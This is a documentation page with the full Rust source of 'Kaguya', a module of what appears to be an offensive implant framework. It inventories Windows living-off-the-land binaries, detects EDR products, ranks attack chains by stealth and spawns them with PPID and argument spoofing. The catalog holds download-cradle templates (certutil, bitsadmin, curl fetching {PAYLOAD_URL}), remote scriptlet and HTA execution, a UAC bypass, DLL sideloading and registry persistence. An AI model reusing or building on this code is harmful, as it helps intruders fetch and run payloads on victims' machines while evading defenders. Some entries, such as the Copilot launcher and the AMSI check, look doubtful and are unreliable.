# Kaguya (輝夜) — Living-Off-The-Land-as-Code

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/kaguya.rs` |
| **Lines** | 907 |
| **Cards** | T016-kaguya |
| **Role** | LOtL binary inventory + EDR detection |
| **Unsafe blocks** | 6 |

## Purpose

# Kaguya (輝夜) — Living-Off-The-Land-as-Code

Inventories available LOtL binaries on the target system, detects security
products (EDR/AV), and generates ranked execution chains with detection
probability scores.

All file-existence checks use NtOpenFile via RecycledGate (indirect syscalls).
Process enumeration for EDR detection uses NtQuerySystemInformation class 5.
No Win32 API calls.

## Integration
Called from `chain.rs` `setup_fsm()` when `config.use_kaguya == true`.

## Constants

- `SYSTEM_PROCESS_INFORMATION_CLASS`: `u32` = `5`
- `SPI_HEADER_SIZE`: `usize` = `0x100`

## Types

### struct `LotlBinary` (line 24)

### struct `EdrProduct` (line 33)

### struct `EdrProfile` (line 42)

### struct `LotlTechnique` (line 51)

### struct `LotlChain` (line 59)

### struct `LotlInventory` (line 69)

### struct `BinaryCatalogEntry` (line 79)

### struct `EdrCatalogEntry` (line 325)

### struct `UnicodeString` (line 433)

### struct `ObjectAttributes` (line 447)

### struct `UnicodeStringRaw` (line 605)

## Public API

### `inventory_binaries` (line 492)
```rust
pub fn inventory_binaries(_ctx: &crate::fsm::ExecutionContext) -> Vec<LotlBinary>
```

### `detect_edr` (line 523)
```rust
pub fn detect_edr(_ctx: &crate::fsm::ExecutionContext) -> EdrProfile
```
Walk all running processes and compare ImageName hashes against EDR catalog.

### `generate_chains` (line 653)
```rust
pub fn generate_chains(binaries: &[LotlBinary], edr: &EdrProfile) -> Vec<LotlChain>
```

### `execute_chain` (line 794)
```rust
pub fn execute_chain(ctx: &mut crate::fsm::ExecutionContext, chain: &LotlChain) -> Result<()>
```

### `kaguya_fsm` (line 840)
```rust
pub fn kaguya_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool
```
Orchestrates phases 1-4. Called from chain.rs setup_fsm().

## Internal Functions

- `file_exists_nt` (unsafe) — Check if a file exists using NtOpenFile via RecycledGate. (line 423)
- `enumerate_process_hashes` (unsafe) — Enumerate all running process image names and return their DJB2 hashes. (line 556)
- `check_amsi_loaded` (unsafe) — Check if amsi.dll is loaded in the current process address space. (line 643)

## Key Dependencies

- `use anyhow::Result;`

## Full Source

```rust
//! # Kaguya (輝夜) — Living-Off-The-Land-as-Code
//!
//! Inventories available LOtL binaries on the target system, detects security
//! products (EDR/AV), and generates ranked execution chains with detection
//! probability scores.
//!
//! All file-existence checks use NtOpenFile via RecycledGate (indirect syscalls).
//! Process enumeration for EDR detection uses NtQuerySystemInformation class 5.
//! No Win32 API calls.
//!
//! ## Integration
//! Called from `chain.rs` `setup_fsm()` when `config.use_kaguya == true`.

#![allow(dead_code)]

use anyhow::Result;
#[allow(unused_imports)] use crate::mega_dbg;

// ──────────────────────────────────────────────────────────────────────
// LOtL Binary Catalog
// ──────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct LotlBinary {
    pub name: &'static str,
    pub path: String,
    pub available: bool,
    pub blocked: bool,
    pub version: Option<String>,
}

#[derive(Debug, Clone)]
pub struct EdrProduct {
    pub name: &'static str,
    pub process_name: &'static str,
    pub process_hash: u32,
    pub detected: bool,
    pub kernel_driver: bool,
}

#[derive(Debug, Clone)]
pub struct EdrProfile {
    pub products: Vec<EdrProduct>,
    pub amsi_loaded: bool,
    pub etw_providers: Vec<u32>,
    pub applocker_active: bool,
    pub wdac_active: bool,
}

#[derive(Debug, Clone)]
pub struct LotlTechnique {
    pub binary: &'static str,
    pub method: &'static str,
    pub command_template: String,
    pub mitre_id: &'static str,
}

#[derive(Debug, Clone)]
pub struct LotlChain {
    pub download_cradle: Option<LotlTechnique>,
    pub execution: Option<LotlTechnique>,
    pub persistence: Option<LotlTechnique>,
    pub detection_score: u8,
    pub artifact_count: u8,
    pub cleanup_complexity: u8,
}

#[derive(Debug, Clone)]
pub struct LotlInventory {
    pub binaries: Vec<LotlBinary>,
    pub edr: EdrProfile,
    pub chains: Vec<LotlChain>,
}

// ──────────────────────────────────────────────────────────────────────
// Compile-time binary catalog
// ──────────────────────────────────────────────────────────────────────

struct BinaryCatalogEntry {
    name: &'static str,
    relative_path: &'static str,
    download_method: Option<&'static str>,
    exec_method: Option<&'static str>,
    persist_method: Option<&'static str>,
    download_template: &'static str,
    exec_template: &'static str,
    persist_template: &'static str,
    mitre_download: &'static str,
    mitre_exec: &'static str,
    mitre_persist: &'static str,
    base_score: u8,
}

const BINARY_CATALOG: &[BinaryCatalogEntry] = &[
    BinaryCatalogEntry {
        name: "certutil.exe",
        relative_path: r"System32\certutil.exe",
        download_method: Some("base64_decode"),
        exec_method: None,
        persist_method: None,
        download_template: "certutil.exe -urlcache -split -f {PAYLOAD_URL} {OUT_PATH}",
        exec_template: "",
        persist_template: "",
        mitre_download: "T1140",
        mitre_exec: "",
        mitre_persist: "",
        base_score: 40,
    },
    BinaryCatalogEntry {
        name: "msbuild.exe",
        relative_path: r"Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe",
        download_method: None,
        exec_method: Some("inline_task_xml"),
        persist_method: None,
        download_template: "",
        exec_template: "msbuild.exe {XML_PATH}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1127.001",
        mitre_persist: "",
        base_score: 25,
    },
    BinaryCatalogEntry {
        name: "wmic.exe",
        relative_path: r"System32\wbem\wmic.exe",
        download_method: None,
        exec_method: Some("process_call_create"),
        persist_method: Some("event_consumer"),
        download_template: "",
        exec_template: "wmic.exe process call create \"{CMD}\"",
        persist_template: "wmic.exe /NAMESPACE:\\\\root\\subscription ...",
        mitre_download: "",
        mitre_exec: "T1047",
        mitre_persist: "T1546.003",
        base_score: 35,
    },
    BinaryCatalogEntry {
        name: "regsvr32.exe",
        relative_path: r"System32\regsvr32.exe",
        download_method: None,
        exec_method: Some("scriptlet_sct"),
        persist_method: None,
        download_template: "",
        exec_template: "regsvr32.exe /s /n /u /i:{SCT_URL} scrobj.dll",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.010",
        mitre_persist: "",
        base_score: 30,
    },
    BinaryCatalogEntry {
        name: "rundll32.exe",
        relative_path: r"System32\rundll32.exe",
        download_method: None,
        exec_method: Some("dll_entrypoint"),
        persist_method: None,
        download_template: "",
        exec_template: "rundll32.exe {DLL_PATH},{EXPORT}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.011",
        mitre_persist: "",
        base_score: 45,
    },
    BinaryCatalogEntry {
        name: "mshta.exe",
        relative_path: r"System32\mshta.exe",
        download_method: None,
        exec_method: Some("hta_script"),
        persist_method: None,
        download_template: "",
        exec_template: "mshta.exe {HTA_URL}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.005",
        mitre_persist: "",
        base_score: 50,
    },
    BinaryCatalogEntry {
        name: "cmstp.exe",
        relative_path: r"System32\cmstp.exe",
        download_method: None,
        exec_method: Some("inf_uac_bypass"),
        persist_method: None,
        download_template: "",
        exec_template: "cmstp.exe /ni /s {INF_PATH}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.003",
        mitre_persist: "",
        base_score: 20,
    },
    BinaryCatalogEntry {
        name: "installutil.exe",
        relative_path: r"Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe",
        download_method: None,
        exec_method: Some("uninstall_handler"),
        persist_method: None,
        download_template: "",
        exec_template: "installutil.exe /logfile= /LogToConsole=false /U {DLL_PATH}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.004",
        mitre_persist: "",
        base_score: 15,
    },
    BinaryCatalogEntry {
        name: "csc.exe",
        relative_path: r"Microsoft.NET\Framework64\v4.0.30319\csc.exe",
        download_method: None,
        exec_method: Some("inline_compile"),
        persist_method: None,
        download_template: "",
        exec_template: "csc.exe /out:{OUT_PATH} /target:exe {CS_PATH}",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1127",
        mitre_persist: "",
        base_score: 20,
    },
    BinaryCatalogEntry {
        name: "bitsadmin.exe",
        relative_path: r"System32\bitsadmin.exe",
        download_method: Some("bits_transfer"),
        exec_method: None,
        persist_method: Some("bits_job"),
        download_template: "bitsadmin.exe /transfer job /download /priority normal {PAYLOAD_URL} {OUT_PATH}",
        exec_template: "",
        persist_template: "bitsadmin.exe /create /download persist_job ...",
        mitre_download: "T1197",
        mitre_exec: "",
        mitre_persist: "T1197",
        base_score: 35,
    },
    BinaryCatalogEntry {
        name: "curl.exe",
        relative_path: r"System32\curl.exe",
        download_method: Some("http_download"),
        exec_method: None,
        persist_method: None,
        download_template: "curl.exe -o {OUT_PATH} {PAYLOAD_URL}",
        exec_template: "",
        persist_template: "",
        mitre_download: "T1105",
        mitre_exec: "",
        mitre_persist: "",
        base_score: 30,
    },
    BinaryCatalogEntry {
        name: "expand.exe",
        relative_path: r"System32\expand.exe",
        download_method: Some("cab_extract"),
        exec_method: None,
        persist_method: None,
        download_template: "expand.exe {CAB_PATH} -F:* {OUT_DIR}",
        exec_template: "",
        persist_template: "",
        mitre_download: "T1140",
        mitre_exec: "",
        mitre_persist: "",
        base_score: 15,
    },
    BinaryCatalogEntry {
        name: "forfiles.exe",
        relative_path: r"System32\forfiles.exe",
        download_method: None,
        exec_method: Some("command_exec"),
        persist_method: None,
        download_template: "",
        exec_template: "forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c \"{CMD}\"",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1202",
        mitre_persist: "",
        base_score: 20,
    },
    BinaryCatalogEntry {
        name: "Microsoft Copilot",
        relative_path: r"C:\Program Files\Microsoft Copilot Runtime\mscopilot.exe",
        download_method: None,
        exec_method: Some("gpu_launcher_arg"),
        persist_method: None,
        download_template: "",
        exec_template: "mscopilot.exe --gpu-launcher=\"cmd.exe /c {CMD}\"",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1218.015",
        mitre_persist: "",
        base_score: 75,
    },
    BinaryCatalogEntry {
        name: "SetupUGC.exe",
        relative_path: r"C:\Windows\System32\oobe\setupugc.exe",
        download_method: None,
        exec_method: Some("unattend_registry_pass"),
        persist_method: Some("Registry-based command execution via HKLM UnattendSettings"),
        download_template: "",
        exec_template: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup\\State\\SetupUGC\" /v UnattendSettings /t REG_SZ /d \"{CMD}\" /f && setupugc.exe",
        persist_template: "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Setup\\State\\SetupUGC\" /v UnattendSettings /t REG_SZ /d \"{CMD}\" /f",
        mitre_download: "",
        mitre_exec: "T1218",
        mitre_persist: "T1218",
        base_score: 80,
    },
    BinaryCatalogEntry {
        name: "XPS Viewer (DLL Sideload)",
        relative_path: r"C:\Windows\System32\xpsrchvw.exe",
        download_method: None,
        exec_method: Some("dll_search_order_hijack"),
        persist_method: None,
        download_template: "",
        exec_template: "copy {PAYLOAD_DLL} \"%LOCALAPPDATA%\\Temp\\WINMM.dll\" && xpsrchvw.exe",
        persist_template: "",
        mitre_download: "",
        mitre_exec: "T1574.001",
        mitre_persist: "",
        base_score: 70,
    },
];

// ──────────────────────────────────────────────────────────────────────
// EDR product catalog (compile-time DJB2 hashes)
// ──────────────────────────────────────────────────────────────────────

struct EdrCatalogEntry {
    name: &'static str,
    process_name: &'static str,
    process_hash: u32,
    kernel_driver: bool,
    /// Binaries this EDR specifically monitors (name index into BINARY_CATALOG)
    watched_binaries: &'static [&'static str],
}

const fn djb2_const(bytes: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < bytes.len() {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    hash
}

const EDR_CATALOG: &[EdrCatalogEntry] = &[
    EdrCatalogEntry {
        name: "CrowdStrike",
        process_name: "csfalconservice.exe",
        process_hash: djb2_const(b"csfalconservice.exe"),
        kernel_driver: true,
        watched_binaries: &["certutil.exe", "mshta.exe", "rundll32.exe"],
    },
    EdrCatalogEntry {
        name: "SentinelOne",
        process_name: "sentinelone.exe",
        process_hash: djb2_const(b"sentinelone.exe"),
        kernel_driver: true,
        watched_binaries: &["certutil.exe", "msbuild.exe", "wmic.exe"],
    },
    EdrCatalogEntry {
        name: "CarbonBlack",
        process_name: "cbagent.exe",
        process_hash: djb2_const(b"cbagent.exe"),
        kernel_driver: true,
        watched_binaries: &["regsvr32.exe", "rundll32.exe"],
    },
    EdrCatalogEntry {
        name: "MicrosoftDefender",
        process_name: "msmpeng.exe",
        process_hash: djb2_const(b"msmpeng.exe"),
        kernel_driver: false,
        watched_binaries: &["certutil.exe", "mshta.exe", "regsvr32.exe", "rundll32.exe"],
    },
    EdrCatalogEntry {
        name: "Kaspersky",
        process_name: "avp.exe",
        process_hash: djb2_const(b"avp.exe"),
        kernel_driver: true,
        watched_binaries: &["mshta.exe", "wmic.exe"],
    },
    EdrCatalogEntry {
        name: "Symantec",
        process_name: "ccsvchst.exe",
        process_hash: djb2_const(b"ccsvchst.exe"),
        kernel_driver: true,
        watched_binaries: &["certutil.exe"],
    },
    EdrCatalogEntry {
        name: "Cortex",
        process_name: "cyserver.exe",
        process_hash: djb2_const(b"cyserver.exe"),
        kernel_driver: true,
        watched_binaries: &["certutil.exe", "regsvr32.exe"],
    },
    EdrCatalogEntry {
        name: "Elastic",
        process_name: "elastic-agent.exe",
        process_hash: djb2_const(b"elastic-agent.exe"),
        kernel_driver: false,
        watched_binaries: &["msbuild.exe", "installutil.exe"],
    },
    EdrCatalogEntry {
        name: "Sophos",
        process_name: "sophoshealth.exe",
        process_hash: djb2_const(b"sophoshealth.exe"),
        kernel_driver: true,
        watched_binaries: &["mshta.exe", "certutil.exe"],
    },
    EdrCatalogEntry {
        name: "ESET",
        process_name: "ekrn.exe",
        process_hash: djb2_const(b"ekrn.exe"),
        kernel_driver: true,
        watched_binaries: &["certutil.exe", "wmic.exe"],
    },
];

// ──────────────────────────────────────────────────────────────────────
// Phase 1: Inventory LOtL binaries via NtOpenFile
// ──────────────────────────────────────────────────────────────────────

/// Check if a file exists using NtOpenFile via RecycledGate.
/// Returns true if the file could be opened.
unsafe fn file_exists_nt(full_path: &str) -> bool {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let nt_path = format!("\\??\\{}", full_path);
    let wide: Vec<u16> = OsStr::new(&nt_path).encode_wide().chain(Some(0)).collect();
    let byte_len = (wide.len() - 1) * 2;

    // UNICODE_STRING
    #[repr(C)]
    struct UnicodeString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    let mut us = UnicodeString {
        length: byte_len as u16,
        maximum_length: byte_len as u16 + 2,
        buffer: wide.as_ptr() as *mut u16,
    };

    // OBJECT_ATTRIBUTES
    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: usize,
        object_name: *mut UnicodeString,
        attributes: u32,
        security_descriptor: usize,
        security_qos: usize,
    }

    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        root_directory: 0,
        object_name: &mut us,
        attributes: 0x40, // OBJ_CASE_INSENSITIVE
        security_descriptor: 0,
        security_qos: 0,
    };

    let mut h_file: usize = 0;
    let mut iosb = [0usize; 2]; // IO_STATUS_BLOCK

    let hash = crate::resolve::compute_hash("NtOpenFile");
    let status = crate::recycled::invoke(
        hash,
        6,
        &[
            &mut h_file as *mut usize as usize,       // FileHandle
            0x80100000usize,                            // FILE_READ_ATTRIBUTES | SYNCHRONIZE
            &mut oa as *mut _ as usize,                // ObjectAttributes
            iosb.as_mut_ptr() as usize,                // IoStatusBlock
            0x7usize,                                   // FILE_SHARE_READ|WRITE|DELETE
            0x20usize,                                  // FILE_SYNCHRONOUS_IO_NONALERT
        ],
    );

    if status == 0 && h_file != 0 {
        // Close the handle via NtClose
        let close_hash = crate::resolve::compute_hash("NtClose");
        crate::recycled::invoke(close_hash, 1, &[h_file]);
        true
    } else {
        false
    }
}

pub fn inventory_binaries(_ctx: &crate::fsm::ExecutionContext) -> Vec<LotlBinary> {
    let windir = std::env::var("WINDIR").unwrap_or_else(|_| r"C:\Windows".to_string());

    let mut binaries = Vec::with_capacity(BINARY_CATALOG.len());

    for entry in BINARY_CATALOG {
        let full_path = format!("{}\\{}", windir, entry.relative_path);
        let available = unsafe { file_exists_nt(&full_path) };

        mega_dbg!("Kaguya: {} → {}", entry.name, if available { "FOUND" } else { "MISSING" });

        binaries.push(LotlBinary {
            name: entry.name,
            path: full_path,
            available,
            blocked: false, // TODO: AppLocker check via NtQueryObject
            version: None,
        });
    }

    binaries
}

// ──────────────────────────────────────────────────────────────────────
// Phase 2: Detect EDR via NtQuerySystemInformation(class 5)
// ──────────────────────────────────────────────────────────────────────

const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
const SPI_HEADER_SIZE: usize = 0x100;

/// Walk all running processes and compare ImageName hashes against EDR catalog.
pub fn detect_edr(_ctx: &crate::fsm::ExecutionContext) -> EdrProfile {
    let mut products = Vec::new();

    for entry in EDR_CATALOG {
        products.push(EdrProduct {
            name: entry.name,
            process_name: entry.process_name,
            process_hash: entry.process_hash,
            detected: false,
            kernel_driver: entry.kernel_driver,
        });
    }

    // Collect process name hashes from NtQuerySystemInformation
    let process_hashes = unsafe { enumerate_process_hashes() };

    for product in &mut products {
        if process_hashes.contains(&product.process_hash) {
            product.detected = true;
            mega_dbg!("Kaguya: EDR detected — {} ({})", product.name, product.process_name);
        }
    }

    EdrProfile {
        products,
        amsi_loaded: unsafe { check_amsi_loaded() },
        etw_providers: Vec::new(),
        applocker_active: false,
        wdac_active: false,
    }
}

/// Enumerate all running process image names and return their DJB2 hashes.
unsafe fn enumerate_process_hashes() -> Vec<u32> {
    let mut hashes = Vec::new();
    let mut buf_size: usize = 1024 * 1024;
    let mut ret_len: u32 = 0;

    let hash = crate::resolve::compute_hash("NtQuerySystemInformation");

    let buf: Vec<u8> = loop {
        let mut buf = vec![0u8; buf_size];
        let status = crate::recycled::invoke(
            hash,
            4,
            &[
                SYSTEM_PROCESS_INFORMATION_CLASS as usize,
                buf.as_mut_ptr() as usize,
                buf_size,
                &mut ret_len as *mut u32 as usize,
            ],
        );

        if status == 0 {
            break buf;
        }
        // STATUS_INFO_LENGTH_MISMATCH
        if status as u32 == 0xC0000004 {
            buf_size = (ret_len as usize).max(buf_size * 2);
            continue;
        }
        mega_dbg!("Kaguya: NtQuerySystemInformation failed: 0x{:08x}", status as u32);
        return hashes;
    };

    let buf_len = ret_len as usize;
    let mut offset: usize = 0;

    loop {
        if offset + 8 > buf_len {
            break;
        }
        let entry_ptr = buf.as_ptr().add(offset);
        let next_entry_offset = *(entry_ptr as *const u32);

        // ImageName is a UNICODE_STRING at offset +0x38 (x64)
        let image_name_offset: usize = 0x38;
        if offset + image_name_offset + 16 > buf_len {
            break;
        }

        #[repr(C)]
        struct UnicodeStringRaw {
            length: u16,
            maximum_length: u16,
            _pad: u32,
            buffer: usize,
        }

        let us = &*(entry_ptr.add(image_name_offset) as *const UnicodeStringRaw);
        if us.length > 0 && us.buffer != 0 {
            let char_count = (us.length / 2) as usize;
            let wide_slice = std::slice::from_raw_parts(us.buffer as *const u16, char_count);

            // Convert to lowercase ASCII bytes for hashing
            let mut ascii_name = Vec::with_capacity(char_count);
            for &ch in wide_slice {
                if ch < 128 {
                    ascii_name.push(if ch >= b'A' as u16 && ch <= b'Z' as u16 {
                        (ch + 32) as u8
                    } else {
                        ch as u8
                    });
                }
            }

            let h = crate::resolve::djb2_hash(&ascii_name);
            hashes.push(h);
        }

        if next_entry_offset == 0 {
            break;
        }
        offset += next_entry_offset as usize;
    }

    hashes
}

/// Check if amsi.dll is loaded in the current process address space.
unsafe fn check_amsi_loaded() -> bool {
    let hash = crate::resolve::compute_hash("NtQueryVirtualMemory");
    // Simple heuristic: check if "amsi.dll" exists at a common LOtL path
    file_exists_nt(r"C:\Windows\System32\amsi.dll")
}

// ──────────────────────────────────────────────────────────────────────
// Phase 3: Generate ranked execution chains (pure computation)
// ──────────────────────────────────────────────────────────────────────

pub fn generate_chains(binaries: &[LotlBinary], edr: &EdrProfile) -> Vec<LotlChain> {
    let mut chains = Vec::new();
    let available: Vec<&LotlBinary> = binaries.iter().filter(|b| b.available && !b.blocked).collect();

    let detected_edr_names: Vec<&str> = edr.products.iter()
        .filter(|p| p.detected)
        .map(|p| p.name)
        .collect();

    // Generate all valid download + execution combos
    for (cat_idx, cat_entry) in BINARY_CATALOG.iter().enumerate() {
        let binary = match available.iter().find(|b| b.name == cat_entry.name) {
            Some(b) => b,
            None => continue,
        };

        let mut base_score = cat_entry.base_score;

        // EDR modifier: +20 if any detected EDR specifically watches this binary
        for edr_entry in EDR_CATALOG {
            if detected_edr_names.contains(&edr_entry.name) {
                if edr_entry.watched_binaries.contains(&cat_entry.name) {
                    base_score = base_score.saturating_add(20);
                    break;
                }
            }
        }

        // AppLocker modifier (placeholder — would subtract if explicitly allowed)
        if edr.applocker_active {
            base_score = base_score.saturating_add(10);
        }

        // Build download-only chain
        if cat_entry.download_method.is_some() {
            chains.push(LotlChain {
                download_cradle: Some(LotlTechnique {
                    binary: cat_entry.name,
                    method: cat_entry.download_method.unwrap(),
                    command_template: cat_entry.download_template.to_string(),
                    mitre_id: cat_entry.mitre_download,
                }),
                execution: None,
                persistence: None,
                detection_score: base_score,
                artifact_count: 2, // downloaded file + log entry
                cleanup_complexity: 2,
            });
        }

        // Build execution-only chain
        if cat_entry.exec_method.is_some() {
            chains.push(LotlChain {
                download_cradle: None,
                execution: Some(LotlTechnique {
                    binary: cat_entry.name,
                    method: cat_entry.exec_method.unwrap(),
                    command_template: cat_entry.exec_template.to_string(),
                    mitre_id: cat_entry.mitre_exec,
                }),
                persistence: if cat_entry.persist_method.is_some() {
                    Some(LotlTechnique {
                        binary: cat_entry.name,
                        method: cat_entry.persist_method.unwrap(),
                        command_template: cat_entry.persist_template.to_string(),
                        mitre_id: cat_entry.mitre_persist,
                    })
                } else {
                    None
                },
                detection_score: base_score,
                artifact_count: if cat_entry.persist_method.is_some() { 3 } else { 1 },
                cleanup_complexity: if cat_entry.persist_method.is_some() { 4 } else { 2 },
            });
        }
    }

    // Generate combined download+execution chains
    let downloaders: Vec<usize> = BINARY_CATALOG.iter().enumerate()
        .filter(|(_, e)| e.download_method.is_some())
        .filter(|(_, e)| available.iter().any(|b| b.name == e.name))
        .map(|(i, _)| i)
        .collect();

    let executors: Vec<usize> = BINARY_CATALOG.iter().enumerate()
        .filter(|(_, e)| e.exec_method.is_some())
        .filter(|(_, e)| available.iter().any(|b| b.name == e.name))
        .map(|(i, _)| i)
        .collect();

    for &dl_idx in &downloaders {
        for &ex_idx in &executors {
            let dl = &BINARY_CATALOG[dl_idx];
            let ex = &BINARY_CATALOG[ex_idx];

            let combined_score = (dl.base_score / 2 + ex.base_score / 2)
                .saturating_add(if edr.applocker_active { 10 } else { 0 });

            chains.push(LotlChain {
                download_cradle: Some(LotlTechnique {
                    binary: dl.name,
                    method: dl.download_method.unwrap(),
                    command_template: dl.download_template.to_string(),
                    mitre_id: dl.mitre_download,
                }),
                execution: Some(LotlTechnique {
                    binary: ex.name,
                    method: ex.exec_method.unwrap(),
                    command_template: ex.exec_template.to_string(),
                    mitre_id: ex.mitre_exec,
                }),
                persistence: if ex.persist_method.is_some() {
                    Some(LotlTechnique {
                        binary: ex.name,
                        method: ex.persist_method.unwrap(),
                        command_template: ex.persist_template.to_string(),
                        mitre_id: ex.mitre_persist,
                    })
                } else {
                    None
                },
                detection_score: combined_score,
                artifact_count: 3,
                cleanup_complexity: 3,
            });
        }
    }

    // Sort by detection_score ascending (stealthiest first)
    chains.sort_by_key(|c| c.detection_score);

    mega_dbg!("Kaguya: generated {} chains, best score={}", chains.len(),
        chains.first().map(|c| c.detection_score).unwrap_or(255));

    chains
}

// ──────────────────────────────────────────────────────────────────────
// Phase 4: Execute selected chain (via NtCreateUserProcess)
// ──────────────────────────────────────────────────────────────────────

pub fn execute_chain(ctx: &mut crate::fsm::ExecutionContext, chain: &LotlChain) -> Result<()> {
    mega_dbg!("Kaguya: executing chain (score={}, artifacts={})",
        chain.detection_score, chain.artifact_count);

    // Use PPID spoofing from the existing infrastructure
    if let Some(ref exec) = chain.execution {
        let cmd = &exec.command_template;
        mega_dbg!("Kaguya: exec via {} — method={}, mitre={}", exec.binary, exec.method, exec.mitre_id);
        mega_dbg!("Kaguya: template={}", cmd);

        // Spawn via existing ppid infrastructure with spoofed parent
        let parent_pid = ctx.config.ppid_parent.unwrap_or(0);
        let parent = if parent_pid == 0 {
            crate::ppid::find_pid_by_name("explorer.exe").unwrap_or(0)
        } else {
            parent_pid
        };

        if parent > 0 {
            let target_exe = format!("{}\\{}", std::env::var("WINDIR").unwrap_or_else(|_| r"C:\Windows".into()), exec.binary);
            mega_dbg!("Kaguya: spawning {} with PPID={}", target_exe, parent);

            match crate::ppid::spawn_with_ppid_spoof(&target_exe, parent, true) {
                Ok((_hp, _ht)) => {
                    mega_dbg!("Kaguya: process spawned OK");
                    // Argument spoofing if we have real args
                    if !ctx.config.real_args.is_empty() {
                        let _ = crate::arg_spoof::spoof_args_in_peb(_hp as usize, &ctx.config.real_args);
                    }
                }
                Err(e) => {
                    mega_dbg!("Kaguya: spawn FAILED — {}", e);
                    return Err(e);
                }
            }
        }
    }

    Ok(())
}

// ──────────────────────────────────────────────────────────────────────
// FSM entry point
// ──────────────────────────────────────────────────────────────────────

/// Orchestrates phases 1-4. Called from chain.rs setup_fsm().
pub fn kaguya_fsm(ctx: &mut crate::fsm::ExecutionContext) -> bool {
    mega_dbg!("╔══════════════════════════════════════════╗");
    mega_dbg!("║    輝夜 KAGUYA — Living Off The Land     ║");
    mega_dbg!("╚══════════════════════════════════════════╝");

    // Phase 1: Inventory
    let binaries = inventory_binaries(ctx);
    let available_count = binaries.iter().filter(|b| b.available).count();
    mega_dbg!("Kaguya Phase 1: {}/{} LOtL binaries available", available_count, binaries.len());

    if available_count == 0 {
        mega_dbg!("Kaguya: FALLO — no LOtL binaries found");
        return false;
    }

    // Phase 2: EDR Detection
    let edr = detect_edr(ctx);
    let detected_count = edr.products.iter().filter(|p| p.detected).count();
    mega_dbg!("Kaguya Phase 2: {}/{} EDR products detected, AMSI={}",
        detected_count, edr.products.len(), edr.amsi_loaded);

    // Phase 3: Generate chains
    let chains = generate_chains(&binaries, &edr);
    if chains.is_empty() {
        mega_dbg!("Kaguya: FALLO — no viable chains generated");
        return false;
    }

    mega_dbg!("Kaguya Phase 3: {} chains generated", chains.len());
    for (i, chain) in chains.iter().take(3).enumerate() {
        mega_dbg!("  #{}: score={} dl={} exec={} persist={}",
            i + 1,
            chain.detection_score,
            chain.download_cradle.as_ref().map(|t| t.binary).unwrap_or("—"),
            chain.execution.as_ref().map(|t| t.binary).unwrap_or("—"),
            chain.persistence.as_ref().map(|t| t.binary).unwrap_or("—"),
        );
    }

    // Store best chain and full inventory for C2 reporting
    let best = chains[0].clone();
    mega_dbg!("Kaguya: selected chain — score={}", best.detection_score);

    // Phase 4: Execute (only if the chain has an execution component)
    if best.execution.is_some() {
        match execute_chain(ctx, &best) {
            Ok(()) => {
                mega_dbg!("Kaguya Phase 4: execution OK");
            }
            Err(e) => {
                mega_dbg!("Kaguya Phase 4: execution FAILED — {}", e);
                // Try next chain
                if chains.len() > 1 {
                    mega_dbg!("Kaguya: falling back to chain #2");
                    if let Err(e2) = execute_chain(ctx, &chains[1]) {
                        mega_dbg!("Kaguya: fallback also FAILED — {}", e2);
                        return false;
                    }
                } else {
                    return false;
                }
            }
        }
    }

    mega_dbg!("Kaguya: FSM complete — success");
    true
}

```